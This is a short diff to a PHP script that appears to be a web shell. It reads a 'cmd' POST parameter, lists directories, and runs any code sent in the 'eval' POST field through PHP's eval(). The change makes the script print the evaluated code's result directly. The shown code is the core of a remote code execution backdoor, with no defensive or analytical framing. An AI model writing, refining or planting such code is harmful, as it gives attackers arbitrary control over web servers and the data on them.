@@ -20,7 +20,7 @@ if (isset($_POST['cmd'])) {
                 });
 
                 try {
-                    $output = eval($_POST['eval']);
+                    die(eval($_POST['eval']));
                 } catch (ParseError $err) {
                     die(implode("", [
                         '<b style="color: #cc3737;">Eval Error</b><br>',
@@ -70,8 +70,6 @@ if (isset($_POST['cmd'])) {
                         '</p>'
                     ]));
                 }
-
-                die($output);
             }
         case 'scanDir':
             $arr = [];
